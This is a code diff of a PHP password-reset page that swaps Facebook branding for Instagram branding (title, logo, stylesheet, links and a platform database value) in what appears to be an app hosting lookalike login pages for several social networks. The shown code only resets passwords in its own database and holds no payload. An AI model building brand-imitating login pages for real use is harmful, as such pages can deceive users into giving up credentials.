@@ -1,12 +1,12 @@
 <?php
 /**
- * Facebook Reset Password
+ * Instagram Reset Password
  * Set new password with valid token
  */
 
 session_start();
-require_once __DIR__ . '/../config/database.php';
-require_once __DIR__ . '/../includes/functions.php';
+require_once __DIR__ . '/config/database.php';
+require_once __DIR__ . '/includes/functions.php';
 
 $error = '';
 $success = '';
@@ -21,7 +21,7 @@ if (empty($token)) {
     $conn = getDbConnection();
     $token_safe = $conn->real_escape_string($token);
 
-    $result = $conn->query("SELECT id, email FROM users WHERE reset_token = '$token_safe' AND reset_token_expires > NOW() AND platform = 'facebook'");
+    $result = $conn->query("SELECT id, email FROM users WHERE reset_token = '$token_safe' AND reset_token_expires > NOW() AND platform = 'instagram'");
 
     if ($result->num_rows > 0) {
         $valid_token = true;
@@ -48,9 +48,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && $valid_token) {
         $password_hash = password_hash($password, PASSWORD_DEFAULT);
 
         // Update password and clear reset token
-        $conn->query("UPDATE users SET password_hash = '$password_hash', reset_token = NULL, reset_token_expires = NULL WHERE reset_token = '$token_safe' AND platform = 'facebook'");
+        $conn->query("UPDATE users SET password_hash = '$password_hash', reset_token = NULL, reset_token_expires = NULL WHERE reset_token = '$token_safe' AND platform = 'instagram'");
 
-        logActivity($user_data['id'], 'facebook', 'password_reset', "Password successfully reset for $user_email");
+        logActivity($user_data['id'], 'instagram', 'password_reset', "Password successfully reset for $user_email");
 
         $success = "Your password has been reset successfully! You can now log in with your new password.";
     }
@@ -61,13 +61,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && $valid_token) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Reset Password - Facebook</title>
-    <link rel="stylesheet" href="assets/css/facebook.css">
+    <title>Reset Password • Instagram</title>
+    <link rel="stylesheet" href="assets/css/instagram.css">
 </head>
 <body>
-    <div class="facebook-container centered">
-        <div class="facebook-login-card">
-            <div class="facebook-logo-small">facebook</div>
+    <div class="instagram-container centered">
+        <div class="instagram-login-card">
+            <div class="instagram-logo-small">Instagram</div>
             <h1>Reset Your Password</h1>
 
             <?php if ($error): ?>
@@ -75,14 +75,14 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && $valid_token) {
                     <p>⚠️ <?= htmlspecialchars($error) ?></p>
                 </div>
                 <div class="footer-links">
-                    <a href="facebook-forgot-password.php">Request New Reset Link</a> •
-                    <a href="facebook-login.php">Back to Login</a>
+                    <a href="instagram-forgot-password.php">Request New Reset Link</a> •
+                    <a href="instagram-login.php">Back to Login</a>
                 </div>
             <?php elseif ($success): ?>
                 <div class="success-box">
                     <p>✓ <?= htmlspecialchars($success) ?></p>
                 </div>
-                <a href="facebook-login.php" class="btn btn-primary btn-block">Go to Login</a>
+                <a href="instagram-login.php" class="btn btn-primary btn-block">Go to Login</a>
             <?php else: ?>
                 <p>Create a new password for your account.</p>
 
@@ -115,7 +115,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && $valid_token) {
                 </form>
 
                 <div class="footer-links">
-                    <a href="facebook-login.php">Cancel and return to login</a>
+                    <a href="instagram-login.php">Cancel and return to login</a>
                 </div>
             <?php endif; ?>
         </div>
